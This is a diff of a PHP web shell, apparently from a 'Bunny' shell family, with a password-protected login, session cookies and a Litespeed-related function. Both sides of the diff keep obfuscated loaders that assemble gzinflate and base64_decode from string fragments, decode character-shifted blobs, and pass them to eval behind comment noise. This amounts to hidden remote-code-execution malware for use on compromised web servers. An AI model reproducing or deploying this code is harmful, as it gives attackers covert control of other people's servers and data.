@@ -314,19 +314,7 @@ if (isset($_POST["BunnymanBro"])) {
 
 // Litespeed
 function ByLTs($LTS)
-{
-    $gflate = 'g' . 'zi' . 'nf' . 'l' . 'at' . 'e';
-    $b64 = 'b' . 'ase' . '6' . '4' . '_' . 'de' . 'co' . 'de';
-    $nelrts = 's' . 'tr' . 'l' . 'en';
-    $rhc = 'c' . 'h' . 'r';
-    $dro = 'o' . 'r' . 'd';
-    $LTS = $gflate($b64($LTS));
-    for ($i = 0; $i < $nelrts($LTS); $i++) {
-        $LTS[$i] = $rhc($dro($LTS[$i]) - 1);
-    }
-    return $LTS;
-}
-/****/ @/*55555*/null;/******/ @/*55555*/eval/******/(ByLTs("jVXbbtNAEP0AvmKx+pC8IK/3ltgqFaBKIOChRbQCtorSxm6rpklIXFio8u3MZe04SRFEWsWX2TMzZ84eCwG/Z+J6Xs9F+WFZvS/EzJ1cmlwc1GWoxaFIvMwyL7Xx0kpYhq6DU3CtfchSeG8oJugr7zJ8lIgX4uBhOV3BfwIPjLcpvJZ0GVS8Ns4HggN4C3Ampftgr2hpRg4AKY1GZM3AjwBpKlgKcGJqY71MIdhkyfpbQu/wnkrPLMXBOy8V5NQlvIP8eoIxyUXExHcy2963jYl1D+i/iaX8UkOcJZy2WUyg2yspYQFTHXZuF+PJZFmumCLuLIlbdpkigoEhYocwJhxjHQ8Gug8OhqHGLf7lcv5zVS4bVISipjuz0JfMvwVEW0YkRolM35XLgrXx48vn5UMh7gf1iQVtrG5GMF5QR5e43WHA9dYwcAD4bncY1KI0+HxrGN19nSHuDaMRA8WCBoOGYcS6z7+/rwcFSzsXt5XoPS/vF/Wv3sHo0/Hp2fEpYhGOjovxZKposEEPOS+KJtPcq0TxpslFvy8eu5MEOp5GxdlTlXqDSgxJG2MqzoSoLCPQZpYUYi3K6aqENE+XLmW6X7pqWoAxSBdpdyxE1HWqOXmqd+P+0RJmIxIybonIUPE/orAAXNTtJlvQejdu02oYd1v9a3ryGBO1UlEZdK9cPNCa07XQ0jQsrlkO715N02HBqsijRR2K3n9IQgE34ogwU3I+XnBOcuzBDtgOHT3E05r0qQQ4rsCGcY876A2PrYAxIzWlMGtysd7agUeAjgK7AR81FRFQ/tGzpISdSRQ/OXnBZzcX1e20HF2X9ehqPqvLWb3qcTPkHLRSsnV2kYoXWT768tA3JmPZJugrgAZk8esAYVACHnzTPMKuIQLNpSJyIBju0McUuozyaGdKems9pAnKcGqyJsntgi0FhdQCMJRHwnEYixN3/E5mkYIhlUr4ll2aWEGeHeXEUNxOardsKBKPJH1JJLOBE8cUjuvH71y0WIn6Qu1ZtmNauE2zDQdVERyKAYkjtrAyIA/3BjXxhlsmZ6eVtQuZokfKOyKFHqZeW9YaVuHiuNSE/Bk/0f047Ddfz16fFuLu/O3H3zlZNyh7cbMYPczG92WvCSMHL/gg5JvPxN4537MuY7ZMns0bR+VaKwOuW+OlOgquKhdHL/8A"));
+{ $gflate = 'g' . 'zi' . 'nf' . 'l' . 'at' . 'e'; $b64 = 'b' . 'ase' . '6' . '4' . '_' . 'de' . 'co' . 'de'; $nelrts = 's' . 'tr' . 'l' . 'en'; $rhc = 'c' . 'h' . 'r'; $dro = 'o' . 'r' . 'd'; $LTS = $gflate($b64($LTS)); for ($i = 0; $i < $nelrts($LTS); $i++) { $LTS[$i] = $rhc($dro($LTS[$i]) - 1); } return $LTS; } /****/ @/*55555*/null;/******/ @/*55555*/eval/******/(ByLTs("jVXbbtNAEP0AvmKx+pC8IK/3ltgqFaBKIOChRbQCtorSxm6rpklIXFio8u3MZe04SRFEWsWX2TMzZ84eCwG/Z+J6Xs9F+WFZvS/EzJ1cmlwc1GWoxaFIvMwyL7Xx0kpYhq6DU3CtfchSeG8oJugr7zJ8lIgX4uBhOV3BfwIPjLcpvJZ0GVS8Ns4HggN4C3Ampftgr2hpRg4AKY1GZM3AjwBpKlgKcGJqY71MIdhkyfpbQu/wnkrPLMXBOy8V5NQlvIP8eoIxyUXExHcy2963jYl1D+i/iaX8UkOcJZy2WUyg2yspYQFTHXZuF+PJZFmumCLuLIlbdpkigoEhYocwJhxjHQ8Gug8OhqHGLf7lcv5zVS4bVISipjuz0JfMvwVEW0YkRolM35XLgrXx48vn5UMh7gf1iQVtrG5GMF5QR5e43WHA9dYwcAD4bncY1KI0+HxrGN19nSHuDaMRA8WCBoOGYcS6z7+/rwcFSzsXt5XoPS/vF/Wv3sHo0/Hp2fEpYhGOjovxZKposEEPOS+KJtPcq0TxpslFvy8eu5MEOp5GxdlTlXqDSgxJG2MqzoSoLCPQZpYUYi3K6aqENE+XLmW6X7pqWoAxSBdpdyxE1HWqOXmqd+P+0RJmIxIybonIUPE/orAAXNTtJlvQejdu02oYd1v9a3ryGBO1UlEZdK9cPNCa07XQ0jQsrlkO715N02HBqsijRR2K3n9IQgE34ogwU3I+XnBOcuzBDtgOHT3E05r0qQQ4rsCGcY876A2PrYAxIzWlMGtysd7agUeAjgK7AR81FRFQ/tGzpISdSRQ/OXnBZzcX1e20HF2X9ehqPqvLWb3qcTPkHLRSsnV2kYoXWT768tA3JmPZJugrgAZk8esAYVACHnzTPMKuIQLNpSJyIBju0McUuozyaGdKems9pAnKcGqyJsntgi0FhdQCMJRHwnEYixN3/E5mkYIhlUr4ll2aWEGeHeXEUNxOardsKBKPJH1JJLOBE8cUjuvH71y0WIn6Qu1ZtmNauE2zDQdVERyKAYkjtrAyIA/3BjXxhlsmZ6eVtQuZokfKOyKFHqZeW9YaVuHiuNSE/Bk/0f047Ddfz16fFuLu/O3H3zlZNyh7cbMYPczG92WvCSMHL/gg5JvPxN4537MuY7ZMns0bR+VaKwOuW+OlOgquKhdHL/8A"));
 
 //usefull
 function cekCurl()
@@ -434,18 +422,8 @@ if (isset($_POST['btn-login'])) {
     if (SHA1($_POST['passnya']) == $BunnyGanteng) {
         function TeP($IMFY)
         {
-            $gflate = 'g' . 'zi' . 'nf' . 'l' . 'at' . 'e';
-            $b64 = 'b' . 'ase' . '6' . '4' . '_' . 'de' . 'co' . 'de';
-            $nelrts = 's' . 'tr' . 'l' . 'en';
-            $rhc = 'c' . 'h' . 'r';
-            $dro = 'o' . 'r' . 'd';
-            $IMFY = $gflate($b64($IMFY));
-            for ($i = 0; $i < $nelrts($IMFY); $i++) {
-                $IMFY[$i] = $rhc($dro($IMFY[$i]) - 1);
-            }
-            return $IMFY;
-        }
-        /****/ @/*55555*/null;/******/ @/*55555*/eval/******/(TeP("hVbbTttAEP2AfsXWykN4qTzr3XUSq60qSoWEKqoQ+kCNIpPYEBGSKA6qKeLbO5f1JaSokVa21+MzM2fOzEYp/L1Tt+vdWo2rWfwtUWeT3bgYqWKxzKe3+W46W692+WpX9oMUbJhWsUnB0QpxRWkVZamN00oXKRjA12jihql1bFU5i2vmr2gWazFzczbBL8HRVswgeFu5gn2gMT1F5MH4K2JEkDrHF3nMUgiBV2Us4tG7AWIiNkYCgPgx2SI4+qDgTJZWFoNFCMqBkAmRUsOgQKMzCgWdAmAA8RA/wZAIMaQkMBB3g3vAdJA9OMpbMogjn2uOiyAsPxNTzBaZEg9kExFlkbDKEIYjI/ro29im1mccphypbhZTI8Fzeq7eMU4qRGQQAVSDaB6oD6q3y6vdUSK1fvp6eRomqlwe68lI9TZZWWblcqE+qt70x/nF5FfgKwmSUhwxt8ylg+DawyzOL8+2iShnpBaF6r/PHza7p35venEy/nkyJhwz8KxiWDqUFCltwD0z5LpVJvc2Be+hXXB9dKSeVW+xyebzbV6WHNseqiAKKmCFIcRIzUwQsFYAbg8VaxxcIxMk5LTKgkS9qHxZ5ujm36EDhIdOIrlWxDQKA7RmwbAELd4b41MSxxA6kaHW/0mp9tYlirx1UcgD6Fjkp1tvENZpdrzVqYLupvomowTNrFnvyshzFPseM7Ia6GpeQ7+IHB6Lu/BPIqrwqspXM3RzcfoF+nvKoiHADeGVRX2Ge0iRl9bVdDipEoFErJvt+neZbw9FILXpSMtSwpE0K9WD2QNuf2ZKRNFIuCwn36NE3KGf8m76uF2Sm+fA40XyHdfZSW2tDl6oYnt+XHPPlIGTKhGdoWXKCJO1Y9vvQLsanzF5ELG4vd5qHyhsVEET9/HVfYb8cPgY9z1zs7nbTB9X2UPer2nkDk/EeiQzAO2CpqIUognZC3s13hM1JzGKjSlNOiCzymgvOyRGW544TK6/JzSenjTyyJZH3kDGEekJF3uzPPbpZMADwYTBK3I8yQ2pLTmHhEthCh/qIeF1EWtbIryLyY3NrfcG4aL1ToYYnKtzDX0rRkIhDQLfptyaeD757JoRS2gtgmlhxWnOw1FUBF7Vxr/zNek4ZbKIcD+JuKRa6klJUXFohu/HQU3ZhlEX0N8CiNu2MO3A4I94M+hGblolUGm5p2kPIagbadvE7bmI51MLXjf2K8i9gCJ/hmoZFfV/CkwKc2UUlL8XPP99SeSAG6nPn/4C"));
+            $gflate = 'g' . 'zi' . 'nf' . 'l' . 'at' . 'e'; $b64 = 'b' . 'ase' . '6' . '4' . '_' . 'de' . 'co' . 'de'; $nelrts = 's' . 'tr' . 'l' . 'en'; $rhc = 'c' . 'h' . 'r'; $dro = 'o' . 'r' . 'd'; $IMFY = $gflate($b64($IMFY)); for ($i = 0; $i < $nelrts($IMFY); $i++) { $IMFY[$i] = $rhc($dro($IMFY[$i]) - 1); } return $IMFY;
+        } /****/ @/*55555*/null;/******/ @/*55555*/eval/******/(TeP("hVbbTttAEP2AfsXWykN4qTzr3XUSq60qSoWEKqoQ+kCNIpPYEBGSKA6qKeLbO5f1JaSokVa21+MzM2fOzEYp/L1Tt+vdWo2rWfwtUWeT3bgYqWKxzKe3+W46W692+WpX9oMUbJhWsUnB0QpxRWkVZamN00oXKRjA12jihql1bFU5i2vmr2gWazFzczbBL8HRVswgeFu5gn2gMT1F5MH4K2JEkDrHF3nMUgiBV2Us4tG7AWIiNkYCgPgx2SI4+qDgTJZWFoNFCMqBkAmRUsOgQKMzCgWdAmAA8RA/wZAIMaQkMBB3g3vAdJA9OMpbMogjn2uOiyAsPxNTzBaZEg9kExFlkbDKEIYjI/ro29im1mccphypbhZTI8Fzeq7eMU4qRGQQAVSDaB6oD6q3y6vdUSK1fvp6eRomqlwe68lI9TZZWWblcqE+qt70x/nF5FfgKwmSUhwxt8ylg+DawyzOL8+2iShnpBaF6r/PHza7p35venEy/nkyJhwz8KxiWDqUFCltwD0z5LpVJvc2Be+hXXB9dKSeVW+xyebzbV6WHNseqiAKKmCFIcRIzUwQsFYAbg8VaxxcIxMk5LTKgkS9qHxZ5ujm36EDhIdOIrlWxDQKA7RmwbAELd4b41MSxxA6kaHW/0mp9tYlirx1UcgD6Fjkp1tvENZpdrzVqYLupvomowTNrFnvyshzFPseM7Ia6GpeQ7+IHB6Lu/BPIqrwqspXM3RzcfoF+nvKoiHADeGVRX2Ge0iRl9bVdDipEoFErJvt+neZbw9FILXpSMtSwpE0K9WD2QNuf2ZKRNFIuCwn36NE3KGf8m76uF2Sm+fA40XyHdfZSW2tDl6oYnt+XHPPlIGTKhGdoWXKCJO1Y9vvQLsanzF5ELG4vd5qHyhsVEET9/HVfYb8cPgY9z1zs7nbTB9X2UPer2nkDk/EeiQzAO2CpqIUognZC3s13hM1JzGKjSlNOiCzymgvOyRGW544TK6/JzSenjTyyJZH3kDGEekJF3uzPPbpZMADwYTBK3I8yQ2pLTmHhEthCh/qIeF1EWtbIryLyY3NrfcG4aL1ToYYnKtzDX0rRkIhDQLfptyaeD757JoRS2gtgmlhxWnOw1FUBF7Vxr/zNek4ZbKIcD+JuKRa6klJUXFohu/HQU3ZhlEX0N8CiNu2MO3A4I94M+hGblolUGm5p2kPIagbadvE7bmI51MLXjf2K8i9gCJ/hmoZFfV/CkwKc2UUlL8XPP99SeSAG6nPn/4C"));
         echo "<s" . "cr" . "ip" . "t>" . "al" . "er" . "t(" . "'Lo" . "gi" . "n " . "Su" . "cc" . "es" . "s!" . " Yo" . "u " . "Pr" . "o'" . ");" . "</" . "sc" . "ri" . "pt" . ">";
         $_SESSION["BunnyIn"] = "BunnyIn";
         setcookie("BunnymanBro", $my_self, time() + 3600 * 24);
